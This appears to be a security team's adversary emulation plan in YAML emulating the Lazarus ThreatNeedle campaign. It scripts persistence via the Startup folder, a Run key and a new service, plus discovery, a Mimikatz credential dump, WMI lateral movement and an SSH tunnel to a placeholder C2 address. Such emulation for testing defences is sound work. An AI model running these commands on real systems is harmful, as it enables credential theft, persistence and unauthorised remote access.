@@ -1,0 +1,286 @@
+---
+- emulation_plan_details:
+    id: 1a2b3c4d-5e6f-7g8h-9i0j-1k2l3m4n5o6p
+    adversary_name: Lazarus_ThreatNeedle_Emulation
+    adversary_description: >
+      Emulation of the Lazarus Group ThreatNeedle campaign (2020-2021). 
+      This graph involves obtaining persistence through the Startup folder and registry modifications,
+      deployment of the ThreatNeedle loader and backdoor, local discovery, 
+      credential dumping with Mimikatz, WMI lateral movement, and SSH protocol tunneling.
+    attack_version: 8.1
+    format_version: 1.0
+
+# ------------------------------------------------------------
+# Step 0: Persistence Through Startup Folder
+# ------------------------------------------------------------
+
+- id: 5f9e2a1b-3d4c-5b6a-7f8e-9d0c1b2a3f4e
+  name: Persistence Through Startup Folder
+  description: >
+    Drops a script into the Windows Startup folder to maintain persistence across reboots.
+  tactic: persistence
+  technique:
+    attack_id: T1547.001
+    name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_persistence
+  procedure_step: "0.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          New-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\threatneedle_sim.bat" -ItemType File -Value "echo simulation" -Force
+  executors:
+  - name: powershell
+    command: |
+      New-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\threatneedle_sim.bat" -ItemType File -Value "echo simulation" -Force
+
+# ------------------------------------------------------------
+# Step 1: Create Registry Entry
+# ------------------------------------------------------------
+
+- id: a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d
+  name: Modify Registry for Persistence
+  description: >
+    Modifies the Run registry key to establish a secondary persistence mechanism.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1112
+    name: "Modify Registry"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_defense_evasion
+  procedure_step: "1.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ThreatNeedleSim" -Value "C:\Windows\Temp\loader.exe" -PropertyType String -Force
+  executors:
+  - name: powershell
+    command: |
+      New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ThreatNeedleSim" -Value "C:\Windows\Temp\loader.exe" -PropertyType String -Force
+
+# ------------------------------------------------------------
+# Step 2: Save 2020-12 ThreatNeedle Loader to File System
+# ------------------------------------------------------------
+
+- id: f1e2d3c4-b5a6-9f8e-7d6c-5b4a3f2e1d0c
+  name: Ingress Tool Transfer (Loader)
+  description: >
+    Simulates the ingress transfer of the malware loader payload to the local disk.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_command_and_control
+  procedure_step: "2.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          echo "MZ_SIMULATED_LOADER_PAYLOAD" > C:\Windows\Temp\loader.exe
+  executors:
+  - name: command_prompt
+    command: |
+      echo "MZ_SIMULATED_LOADER_PAYLOAD" > C:\Windows\Temp\loader.exe
+
+# ------------------------------------------------------------
+# Step 3: New Service
+# ------------------------------------------------------------
+
+- id: 11223344-5566-7788-9900-aabbccddeeff
+  name: Create Windows Service
+  description: >
+    Creates a new Windows service that points to the ThreatNeedle loader dropped in the previous step.
+  tactic: persistence
+  technique:
+    attack_id: T1543.003
+    name: "Create or Modify System Process: Windows Service"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_persistence
+  procedure_step: "3.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          sc create ThreatNeedleService binPath= "C:\Windows\Temp\loader.exe" start= auto
+  executors:
+  - name: command_prompt
+    command: |
+      sc create ThreatNeedleService binPath= "C:\Windows\Temp\loader.exe" start= auto
+
+# ------------------------------------------------------------
+# Step 4: Query Registry Script
+# ------------------------------------------------------------
+
+- id: ffeeddcc-bbaa-0099-8877-665544332211
+  name: Query Registry Script
+  description: >
+    Queries the registry to gather configuration information and assess the host environment.
+  tactic: discovery
+  technique:
+    attack_id: T1012
+    name: "Query Registry"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_discovery
+  procedure_step: "4.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /s
+  executors:
+  - name: command_prompt
+    command: |
+      reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /s
+
+# ------------------------------------------------------------
+# Step 5: Save ThreatNeedle Backdoor to File System
+# ------------------------------------------------------------
+
+- id: aa11bb22-cc33-dd44-ee55-ff6677889900
+  name: Ingress Tool Transfer (Backdoor)
+  description: >
+    Simulates the deployment of the secondary payload (the actual backdoor based on Manuscrypt) to the disk.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_command_and_control
+  procedure_step: "5.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          echo "MZ_SIMULATED_BACKDOOR_PAYLOAD" > C:\Windows\Temp\backdoor.exe
+  executors:
+  - name: command_prompt
+    command: |
+      echo "MZ_SIMULATED_BACKDOOR_PAYLOAD" > C:\Windows\Temp\backdoor.exe
+
+# ------------------------------------------------------------
+# Step 6: File and Directory Discovery
+# ------------------------------------------------------------
+
+- id: 99887766-5544-3322-1100-ffeeddccbbaa
+  name: File and Directory Discovery
+  description: >
+    Searches local directories to find files of interest or map the local directory structure.
+  tactic: discovery
+  technique:
+    attack_id: T1083
+    name: "File and Directory Discovery"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_discovery
+  procedure_step: "6.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          dir C:\Users\ /s /b
+  executors:
+  - name: command_prompt
+    command: |
+      dir C:\Users\ /s /b
+
+# ------------------------------------------------------------
+# Step 7: Dump OS Passwords
+# ------------------------------------------------------------
+
+- id: 1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
+  name: OS Credential Dumping (Mimikatz)
+  description: >
+    Uses Mimikatz to dump credentials available on the host.
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: "OS Credential Dumping"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_credential_access
+  procedure_step: "7.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+  executors:
+  - name: powershell
+    command: |
+      .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# ------------------------------------------------------------
+# Step 8: Lateral Movement Through WMI
+# ------------------------------------------------------------
+
+- id: f6e5d4c3-b2a1-f6e5-d4c3-b2a1f6e5d4c3
+  name: Lateral Movement Through WMI
+  description: >
+    Uses Windows Management Instrumentation (WMI) to attempt lateral movement to another endpoint.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1047
+    name: "Windows Management Instrumentation"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_lateral_movement
+  procedure_step: "8.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          wmic /node:#{target.remote.node} process call create "cmd.exe /c echo WMI Lateral Movement Simulated"
+  executors:
+  - name: command_prompt
+    command: |
+      wmic /node:#{target.remote.node} process call create "cmd.exe /c echo WMI Lateral Movement Simulated"
+
+# ------------------------------------------------------------
+# Step 9: Obtain Service Information via sc queryex
+# ------------------------------------------------------------
+
+- id: 7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c2d
+  name: System Service Discovery
+  description: >
+    Microsoft’s native sc utility is executed to query a list of all running services.
+  tactic: discovery
+  technique:
+    attack_id: T1007
+    name: "System Service Discovery"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_discovery
+  procedure_step: "9.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          sc queryex
+  executors:
+  - name: command_prompt
+    command: |
+      sc queryex
+
+# ------------------------------------------------------------
+# Step 10: SSH Connection to AttackQ Server
+# ------------------------------------------------------------
+
+- id: 3d4c5b6a-7e8f-9a0b-1c2d-3e4f5a6b7c8d
+  name: Protocol Tunneling (SSH)
+  description: >
+    Tests egress security controls by attempting to tunnel an outbound SSH connection to an external server.
+  tactic: command-and-control
+  technique:
+    attack_id: T1572
+    name: "Protocol Tunneling"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_command_and_control
+  procedure_step: "10.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          ssh -o StrictHostKeyChecking=no user@#{external.c2.ip}
+  executors:
+  - name: powershell
+    command: |
+      ssh -o StrictHostKeyChecking=no user@#{external.c2.ip}
